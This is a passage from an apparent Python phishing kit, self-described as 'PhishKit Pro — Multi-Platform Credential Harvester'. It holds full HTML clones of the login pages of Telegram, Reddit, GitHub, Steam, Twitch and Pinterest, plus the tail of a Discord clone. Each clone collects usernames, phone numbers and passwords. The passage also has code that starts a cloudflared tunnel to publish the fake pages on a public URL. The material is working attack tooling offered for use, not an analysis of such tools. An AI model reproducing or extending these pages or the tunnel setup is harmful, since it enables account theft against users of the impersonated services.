      <svg width="44" height="44" viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z"/></svg>
    </div>
    <h1>Welcome back!</h1>
    <p class="sub">We're so excited to see you again!</p>
    <form action="/login" method="POST">
      <div class="field">
        <label>Email or Phone Number <span class="req">*</span></label>
        <input type="text" name="email" autocomplete="username" required>
      </div>
      <div class="field">
        <label>Password <span class="req">*</span></label>
        <div class="pw-wrap">
          <input type="password" name="password" id="dcPw" autocomplete="current-password" required>
          <button type="button" class="show-pw-btn" onclick="var i=document.getElementById('dcPw');i.type=i.type=='password'?'text':'password'">👁</button>
        </div>
        <a class="forgot" href="#">Forgot your password?</a>
      </div>
      <button class="btn-login" type="submit">Log In</button>
      <button class="btn-qr" type="button">Log in with QR Code</button>
    </form>
    <div class="register">Need an account? <a href="#">Register</a></div>
  </div>
</div>
</body></html>'''

# ── Telegram (Mobile) ──────────────────────────────────────────────────────────
PAGES['telegram'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Telegram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#17212b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.container{width:100%;max-width:400px;padding:40px 24px;text-align:center}
.tg-logo{margin-bottom:24px}
.tg-logo svg{width:96px;height:96px}
h1{font-size:28px;font-weight:700;margin-bottom:8px;color:#fff}
.sub{font-size:15px;color:#8e9aa7;margin-bottom:32px;line-height:1.5}
.country-select{display:flex;align-items:center;width:100%;background:#212d3b;border:1px solid #2b5278;border-radius:12px 12px 0 0;padding:14px 16px;margin-bottom:1px;cursor:pointer;justify-content:space-between}
.country-name{font-size:16px;color:#fff}
.country-code{color:#8e9aa7;font-size:16px}
.phone-input{width:100%;background:#212d3b;border:1px solid #2b5278;border-top:none;border-radius:0 0 12px 12px;padding:14px 16px;font-size:18px;color:#fff;outline:none;-webkit-appearance:none;font-family:inherit;letter-spacing:2px}
.phone-input::placeholder{color:#8e9aa7;letter-spacing:0;font-size:15px}
.btn{width:100%;margin-top:24px;padding:15px;background:#2ca5e0;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;-webkit-appearance:none;font-family:inherit}
.btn:active{background:#1a96d4}
.pw-section{margin-top:16px}
.pw-section input{width:100%;background:#212d3b;border:1px solid #2b5278;border-radius:12px;padding:14px 16px;font-size:16px;color:#fff;outline:none;-webkit-appearance:none;font-family:inherit}
.pw-section input::placeholder{color:#8e9aa7}
.pw-section input:focus{border-color:#2ca5e0}
.qr-link{margin-top:24px;color:#2ca5e0;font-size:15px;text-decoration:none;display:block}
</style></head>
<body>
<div class="container">
  <div class="tg-logo">
    <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs><linearGradient id="tg" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#2AABEE"/><stop offset="1" stop-color="#229ED9"/></linearGradient></defs>
      <circle cx="120" cy="120" r="120" fill="url(#tg)"/>
      <path fill="#fff" d="M55.9 113.4l102.6-39.6c4.8-1.7 9 1.2 7.4 8.6l-17.5 82.4c-1.3 5.7-4.7 7.1-9.5 4.4l-26.2-19.3-12.7 12.2c-1.4 1.4-2.6 2.6-5.3 2.6l1.9-26.6 48.3-43.6c2.1-1.9-.5-2.9-3.2-1l-59.8 37.6-25.7-8c-5.6-1.7-5.7-5.6 1.2-8.3z"/>
    </svg>
  </div>
  <h1>Sign in to Telegram</h1>
  <p class="sub">Please enter your country code and phone number.</p>
  <form action="/login" method="POST">
    <div class="country-select">
      <span class="country-name">🇧🇩 Bangladesh</span>
      <span class="country-code">+880 ▾</span>
    </div>
    <input class="phone-input" type="tel" name="phone" placeholder="Your phone number" required>
    <div class="pw-section">
      <input type="password" name="password" placeholder="2-Step Verification password (optional)">
    </div>
    <button class="btn" type="submit">Next</button>
  </form>
  <a class="qr-link" href="#">Log in by QR Code</a>
</div>
</body></html>'''

# ── Reddit (Mobile) ───────────────────────────────────────────────────────────
PAGES['reddit'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Reddit - Log In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.header{width:100%;padding:16px 20px;border-bottom:1px solid #edeff1;display:flex;justify-content:center}
.reddit-logo{display:flex;align-items:center;gap:10px}
.reddit-icon{width:36px;height:36px}
.reddit-name{font-size:20px;font-weight:700;color:#ff4500}
.container{width:100%;max-width:400px;padding:32px 20px}
h2{font-size:20px;font-weight:700;color:#1c1c1c;margin-bottom:4px;text-align:center}
.sub{font-size:14px;color:#878a8c;text-align:center;margin-bottom:24px}
.sso-btn{width:100%;padding:12px;background:#fff;border:1px solid #edeff1;border-radius:9999px;font-size:14px;font-weight:700;color:#1c1c1c;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.08);-webkit-appearance:none;font-family:inherit}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#878a8c;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:1px}
.or-line{flex:1;height:1px;background:#edeff1}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;font-weight:700;color:#1c1c1c;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
.field input{width:100%;padding:12px 14px;border:1.5px solid #edeff1;border-radius:4px;font-size:14px;color:#1c1c1c;outline:none;-webkit-appearance:none;font-family:inherit}
.field input:focus{border-color:#ff4500;box-shadow:0 0 0 1px #ff4500}
.btn-login{width:100%;padding:13px;background:#ff4500;color:#fff;border:none;border-radius:9999px;font-size:14px;font-weight:700;cursor:pointer;-webkit-appearance:none;font-family:inherit;margin-top:4px}
.btn-login:active{background:#e63d00}
.forgot{display:block;text-align:center;color:#0079d3;font-size:13px;text-decoration:none;margin-top:16px}
.terms{font-size:12px;color:#878a8c;text-align:center;margin-top:20px;line-height:1.5}
.terms a{color:#0079d3;text-decoration:none}
.signup-row{text-align:center;font-size:14px;color:#878a8c;margin-top:32px;padding-top:20px;border-top:1px solid #edeff1}
.signup-row a{color:#ff4500;font-weight:700;text-decoration:none}
</style></head>
<body>
<div class="header">
  <div class="reddit-logo">
    <svg class="reddit-icon" viewBox="0 0 20 20" fill="#ff4500"><circle cx="10" cy="10" r="10"/><path fill="#fff" d="M16.7 10c0-1-.8-1.7-1.8-1.7-.5 0-.9.2-1.2.4-1.2-.8-2.8-1.3-4.6-1.4l.8-3.7 2.5.5c0 .6.5 1.1 1.1 1.1.6 0 1.1-.5 1.1-1.1S14.1 3 13.5 3c-.5 0-.9.3-1 .7L10 3.1 8.9 7.3C7.1 7.4 5.5 7.9 4.3 8.7c-.3-.3-.8-.5-1.3-.5-1 0-1.8.8-1.8 1.8 0 .7.4 1.3 1 1.6v.4c0 2 2.5 3.7 5.8 3.7 3.3 0 5.8-1.7 5.8-3.7v-.4c.6-.3 1-1 1-1.6zM6 11c0-.6.5-1 1-1s1 .4 1 1-.5 1-1 1-1-.4-1-1zm5.5 2.7c-.7.7-2.3.7-3 0-.2-.1-.2-.4 0-.5.1-.1.4-.1.5 0 .5.4 1.5.4 2 0 .1-.1.4-.1.5 0 .2.1.2.4 0 .5zm-.1-1.7c-.5 0-1-.4-1-1s.5-1 1-1 1 .4 1 1-.4 1-1 1z"/></svg>
    <span class="reddit-name">reddit</span>
  </div>
</div>
<div class="container">
  <h2>Log In</h2>
  <p class="sub">By continuing, you agree to our User Agreement and acknowledge that you understand the Privacy Policy.</p>
  <button class="sso-btn">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <div class="field"><label>Username</label><input type="text" name="username" autocomplete="username" required></div>
    <div class="field"><label>Password</label><input type="password" name="password" autocomplete="current-password" required></div>
    <button class="btn-login" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgot your username or password?</a>
  <div class="terms">This site is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</div>
  <div class="signup-row">New to Reddit? <a href="#">Sign Up</a></div>
</div>
</body></html>'''

# ── GitHub (Mobile) ───────────────────────────────────────────────────────────
PAGES['github'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in to GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#0d1117;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#e6edf3;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.header{padding:24px 20px 16px;text-align:center}
.gh-logo{width:44px;height:44px}
.container{width:100%;max-width:400px;padding:0 16px 32px}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:24px}
h1{font-size:24px;font-weight:300;color:#e6edf3;text-align:center;margin-bottom:20px}
.field{margin-bottom:14px}
.field label{display:block;font-size:14px;font-weight:600;color:#e6edf3;margin-bottom:6px}
.field label a{color:#58a6ff;font-weight:400;float:right;font-size:13px;text-decoration:none}
.field input{width:100%;padding:8px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;font-size:14px;color:#e6edf3;outline:none;-webkit-appearance:none;font-family:inherit}
.field input:focus{border-color:#388bfd;box-shadow:0 0 0 3px rgba(56,139,253,.3)}
.field input::placeholder{color:#8b949e}
.btn-login{width:100%;padding:9px;background:#238636;color:#fff;border:1px solid rgba(240,246,252,.1);border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;-webkit-appearance:none;font-family:inherit;margin-top:4px}
.btn-login:active{background:#2ea043}
.divider{display:flex;align-items:center;gap:8px;margin:16px 0;color:#8b949e;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#21262d}
.btn-passkey{width:100%;padding:9px;background:transparent;border:1px solid #30363d;border-radius:6px;font-size:14px;color:#e6edf3;cursor:pointer;font-family:inherit}
.signup-box{border:1px solid #30363d;border-radius:6px;padding:16px;margin-top:16px;text-align:center;font-size:14px;color:#8b949e}
.signup-box a{color:#58a6ff;text-decoration:none}
.footer{text-align:center;font-size:12px;color:#8b949e;margin-top:20px;line-height:2}
.footer a{color:#8b949e;text-decoration:none}
</style></head>
<body>
<div class="header">
  <svg class="gh-logo" viewBox="0 0 98 96" fill="#e6edf3" xmlns="http://www.w3.org/2000/svg"><path d="M49 0C21.9 0 0 22 0 49.2c0 21.8 14 40.2 33.4 46.7 2.4.5 3.3-1.1 3.3-2.4V83.9c-13.6 3-16.5-6.6-16.5-6.6-2.2-5.7-5.4-7.2-5.4-7.2-4.4-3 .3-2.9.3-2.9 4.9.3 7.5 5 7.5 5 4.3 7.5 11.4 5.3 14.1 4 .4-3.1 1.7-5.3 3-6.5-10.8-1.2-22.2-5.5-22.2-24.3 0-5.4 1.9-9.8 5-13.2-.5-1.2-2.1-6.2.5-13 0 0 4.1-1.3 13.4 5 3.9-1.1 8-1.6 12.2-1.6 4.1 0 8.3.5 12.2 1.6 9.3-6.3 13.3-5 13.3-5 2.6 6.8 1 11.8.5 13 3.1 3.4 5 7.8 5 13.2 0 18.9-11.4 23.1-22.3 24.3 1.7 1.5 3.3 4.5 3.3 9.1v13.5c0 1.3.8 2.9 3.3 2.4C84 89.4 98 71 98 49.2 98 22 76.1 0 49 0z"/></svg>
</div>
<div class="container">
  <div class="card">
    <h1>Sign in to GitHub</h1>
    <form action="/login" method="POST">
      <div class="field">
        <label>Username or email address</label>
        <input type="text" name="email" autocomplete="username" required>
      </div>
      <div class="field">
        <label>Password <a href="#">Forgot password?</a></label>
        <input type="password" name="password" autocomplete="current-password" required>
      </div>
      <button class="btn-login" type="submit">Sign in</button>
    </form>
    <div class="divider">or</div>
    <button class="btn-passkey">🔑 Sign in with a passkey</button>
  </div>
  <div class="signup-box">New to GitHub? <a href="#">Create an account.</a></div>
  <div class="footer">
    <a href="#">Terms</a> · <a href="#">Privacy</a> · <a href="#">Security</a> · <a href="#">Contact GitHub</a>
  </div>
</div>
</body></html>'''

# ── Steam (Mobile) ────────────────────────────────────────────────────────────
PAGES['steam'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Steam Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#1b2838;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.header{width:100%;background:#171a21;padding:16px 20px;display:flex;justify-content:center;border-bottom:1px solid #000}
.steam-logo{color:#c6d4df;font-size:20px;font-weight:700;letter-spacing:3px;display:flex;align-items:center;gap:10px}
.steam-logo svg{width:32px;height:32px}
.container{width:100%;max-width:400px;padding:32px 16px}
.card{background:#2a475e;border-radius:4px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,.4)}
.card-header{background:#1e3a4f;padding:16px 20px;font-size:16px;font-weight:700;color:#b8c5d0;border-bottom:1px solid #000;text-align:center}
.card-body{padding:24px 20px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;color:#8f98a0;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
.field input{width:100%;padding:10px 12px;background:#32689b;border:1px solid #567592;border-radius:3px;font-size:15px;color:#c6d4df;outline:none;-webkit-appearance:none;font-family:inherit}
.field input:focus{border-color:#8ec9f0;background:#3b7ab5}
.field input::placeholder{color:#7a9ebf}
.remember-row{display:flex;align-items:center;gap:8px;margin-bottom:20px;font-size:13px;color:#8f98a0}
.remember-row input[type="checkbox"]{width:16px;height:16px;accent-color:#4d9de0}
.btn-login{width:100%;padding:12px;background:linear-gradient(180deg,#4d9de0,#1b6098);color:#c6d4df;border:none;border-radius:2px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:1px;text-transform:uppercase;font-family:inherit;-webkit-appearance:none}
.btn-login:active{background:#1b6098}
.card-footer{background:#1e3a4f;padding:14px 20px;display:flex;justify-content:space-between;border-top:1px solid #000}
.card-footer a{color:#67c1f5;font-size:13px;text-decoration:none}
.help-text{text-align:center;font-size:12px;color:#8f98a0;margin-top:16px;line-height:1.5}
.help-text a{color:#67c1f5;text-decoration:none}
</style></head>
<body>
<div class="header">
  <div class="steam-logo">
    <svg viewBox="0 0 50 50" fill="#c6d4df"><path d="M25 1C11.8 1 1 11.8 1 25c0 10.6 6.8 19.6 16.3 22.9l5.3-11c-.2-.5-.3-1-.3-1.5 0-3 2.2-5.4 5.1-5.8V25c0-5 4.1-9.2 9.1-9.2s9.1 4.1 9.1 9.2c0 5-4.1 9.2-9.1 9.2h-.2l-10.8 5.4c0 .1 0 .2-.1.3 0 3.9-3.2 7.1-7.1 7.1-3.4 0-6.3-2.4-7-5.6L1.8 39C4.4 45.2 10.6 49.5 18 49.7c.3 0 .6 0 .9.1 0 0 0 0 .1 0 .1 0 .2 0 .3 0H25c13.2 0 24-10.8 24-24S38.2 1 25 1zM17 42c0 2.2-1.8 4-4 4s-4-1.8-4-4 1.8-4 4-4 4 1.8 4 4zm19.2-13.6c-3.4 0-6.2-2.8-6.2-6.2s2.8-6.2 6.2-6.2 6.2 2.8 6.2 6.2-2.8 6.2-6.2 6.2z"/></svg>
    STEAM
  </div>
</div>
<div class="container">
  <div class="card">
    <div class="card-header">SIGN IN WITH STEAM ACCOUNT</div>
    <div class="card-body">
      <form action="/login" method="POST">
        <div class="field"><label>Steam Account Name</label><input type="text" name="username" autocomplete="username" required></div>
        <div class="field"><label>Password</label><input type="password" name="password" autocomplete="current-password" required></div>
        <div class="remember-row"><input type="checkbox" id="rem" checked><label for="rem">Remember me on this computer</label></div>
        <button class="btn-login" type="submit">Sign In</button>
      </form>
    </div>
    <div class="card-footer">
      <a href="#">Forgot your login?</a>
      <a href="#">Need help?</a>
    </div>
  </div>
  <div class="help-text">By clicking Sign In, you agree to the <a href="#">Steam Subscriber Agreement</a> and <a href="#">Privacy Policy</a>.</div>
</div>
</body></html>'''

# ── Twitch (Mobile) ───────────────────────────────────────────────────────────
PAGES['twitch'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Log in to Twitch</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#18181b;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#efeff1;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.header{width:100%;padding:16px 20px;display:flex;justify-content:center;border-bottom:1px solid #2f2f35}
.tw-logo{color:#a970ff;font-size:26px;font-weight:900;letter-spacing:-1px}
.container{width:100%;max-width:360px;padding:32px 20px}
h1{font-size:20px;font-weight:700;color:#efeff1;margin-bottom:24px;text-align:center}
.field{margin-bottom:14px}
.field label{display:block;font-size:13px;font-weight:700;color:#adadb8;margin-bottom:6px}
.field input{width:100%;padding:10px 12px;background:#18181b;border:2px solid #2f2f35;border-radius:4px;font-size:14px;color:#efeff1;outline:none;-webkit-appearance:none;font-family:inherit}
.field input:focus{border-color:#9147ff}
.field input::placeholder{color:#6a6a7c}
.forgot{display:block;text-align:right;color:#a970ff;font-size:13px;text-decoration:none;margin-bottom:20px;margin-top:4px}
.btn-login{width:100%;padding:12px;background:#9147ff;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#772ce8}
.divider{display:flex;align-items:center;gap:12px;margin:20px 0;color:#adadb8;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#2f2f35}
.btn-sso{width:100%;padding:11px;background:transparent;border:1px solid #2f2f35;border-radius:4px;font-size:13px;color:#efeff1;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;-webkit-appearance:none;font-family:inherit}
.signup-row{text-align:center;font-size:13px;color:#adadb8;margin-top:24px;padding-top:20px;border-top:1px solid #2f2f35}
.signup-row a{color:#a970ff;font-weight:600;text-decoration:none}
.trouble{display:block;text-align:center;color:#a970ff;font-size:13px;text-decoration:none;margin-top:12px}
</style></head>
<body>
<div class="header">
  <div class="tw-logo">twitch</div>
</div>
<div class="container">
  <h1>Log in to Twitch</h1>
  <form action="/login" method="POST">
    <div class="field"><label>Username</label><input type="text" name="username" autocomplete="username" required></div>
    <div class="field"><label>Password</label><input type="password" name="password" autocomplete="current-password" required></div>
    <a class="forgot" href="#">Forgot your password?</a>
    <button class="btn-login" type="submit">Log In</button>
  </form>
  <div class="divider">or</div>
  <button class="btn-sso">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Log in with Google
  </button>
  <button class="btn-sso">🍎 Log in with Apple</button>
  <a class="trouble" href="#">Having trouble logging in?</a>
  <div class="signup-row">Don't have an account? <a href="#">Sign Up</a></div>
</div>
</body></html>'''

# ── Pinterest (Mobile) ────────────────────────────────────────────────────────
PAGES['pinterest'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Pinterest</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.container{width:100%;max-width:400px;padding:40px 24px}
.pin-logo{text-align:center;margin-bottom:20px}
.pin-icon{width:50px;height:50px;background:#e60023;border-radius:50%;display:inline-flex;align-items:center;justify-content:center}
.pin-icon svg{width:30px;height:30px;fill:#fff}
h1{font-size:24px;font-weight:700;color:#111;text-align:center;margin-bottom:4px}
.sub{font-size:14px;color:#767676;text-align:center;margin-bottom:28px}
.sso-btn{width:100%;padding:13px;background:#fff;border:1.5px solid #cdcdcd;border-radius:9999px;font-size:15px;font-weight:600;color:#111;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;-webkit-appearance:none;font-family:inherit}
.sso-btn:active{background:#f8f8f8}
.or-row{display:flex;align-items:center;gap:12px;margin:16px 0;color:#767676;font-size:13px}
.or-line{flex:1;height:1px;background:#e2e2e2}
input{width:100%;padding:13px 14px;border:1.5px solid #cdcdcd;border-radius:9999px;font-size:15px;color:#111;outline:none;margin-bottom:10px;-webkit-appearance:none;font-family:inherit;text-align:left}
input:focus{border-color:#e60023;box-shadow:0 0 0 3px rgba(230,0,35,.15)}
input::placeholder{color:#767676}
.btn-login{width:100%;padding:13px;background:#e60023;color:#fff;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#c3001d}
.forgot{display:block;text-align:center;color:#e60023;font-size:14px;text-decoration:none;margin-top:16px;font-weight:600}
.signup-row{text-align:center;font-size:14px;color:#767676;margin-top:28px;padding-top:20px;border-top:1px solid #e2e2e2}
.signup-row a{color:#e60023;font-weight:700;text-decoration:none}
.terms{font-size:12px;color:#767676;text-align:center;margin-top:16px;line-height:1.5}
.terms a{color:#111;text-decoration:underline}
</style></head>
<body>
<div class="container">
  <div class="pin-logo">
    <div class="pin-icon">
      <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12c0 5.1 3.1 9.4 7.5 11.3-.1-.9-.2-2.4 0-3.4.2-.9 1.4-5.8 1.4-5.8s-.4-.7-.4-1.8c0-1.7 1-2.9 2.2-2.9 1 0 1.5.8 1.5 1.7 0 1-.7 2.6-1 4 .3 1.3 1.4 2.2 2.7 2.2 3.2 0 5.4-3.4 5.4-8.3 0-4.4-3.1-7.4-7.5-7.4-5.1 0-8.1 3.8-8.1 7.8 0 1.5.6 3.1 1.3 4 .1.2.2.3.1.5-.1.5-.4 1.7-.5 1.9-.1.3-.2.3-.5.2C2.7 15.8 1 12.7 1 9.4 1 4.2 5 0 12 0c5.8 0 10.3 4.1 10.3 9.6 0 5.8-3.6 10.5-8.7 10.5-1.7 0-3.3-.9-3.9-1.9l-1 4c-.4 1.4-1.4 3.1-2 4.1.6.2 1.2.3 1.8.3.5.1 1.1.2 1.6.2 6.6 0 12-5.4 12-12S18.6 0 12 0z"/></svg>
    </div>
  </div>
  <h1>Welcome to Pinterest</h1>
  <p class="sub">Find new ideas to try</p>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <button class="sso-btn">🔵 Continue with Facebook</button>
  <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email" autocomplete="email" required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button class="btn-login" type="submit">Log in</button>
  </form>
  <a class="forgot" href="#">Forgot your password?</a>
  <div class="terms">By continuing, you agree to Pinterest's <a href="#">Terms of Service</a> and acknowledge you've read our <a href="#">Privacy Policy</a>.</div>
  <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body></html>'''
# ─── Utility: get local IP ────────────────────────────────────────────────────
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

# ─── Cloudflare tunnel ────────────────────────────────────────────────────────
cf_url   = None
cf_proc  = None

def start_cloudflare(port):
    global cf_url, cf_proc
    try:
        cf_proc = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        print(Fore.YELLOW + '  ⏳ Cloudflare tunnel starting...')
        for line in cf_proc.stdout:
            if 'trycloudflare.com' in line:
                import re
                m = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com', line)
                if m:
                    cf_url = m.group(0)
                    print(Fore.GREEN + f'\n  ✓ Cloudflare URL: {cf_url}\n')
                    break
    except FileNotFoundError:
        print(Fore.RED + '\n  ✗ cloudflared not found.')
        print(Fore.YELLOW + '  Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation\n')

# ─── ASCII Banner ──────────────────────────────────────────────────────────────
BANNER = f"""
{Fore.RED}
  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗  ██╗██╗████████╗
  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║ ██╔╝██║╚══██╔══╝
  ██████╔╝███████║██║███████╗███████║█████╔╝ ██║   ██║
  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔═██╗ ██║   ██║
  ██║     ██║  ██║██║███████║██║  ██║██║  ██╗██║   ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝
{Fore.YELLOW}
  ██████╗ ██████╗  ██████╗
  ██╔══██╗██╔══██╗██╔═══██╗
  ██████╔╝██████╔╝██║   ██║
  ██╔═══╝ ██╔══██╗██║   ██║
  ██║     ██║  ██║╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝
{Style.RESET_ALL}
  {Fore.CYAN}PhishKit Pro{Style.RESET_ALL} — Multi-Platform Credential Harvester
  {Fore.WHITE}22 Platforms  |  Local + Cloudflare Tunnel{Style.RESET_ALL}
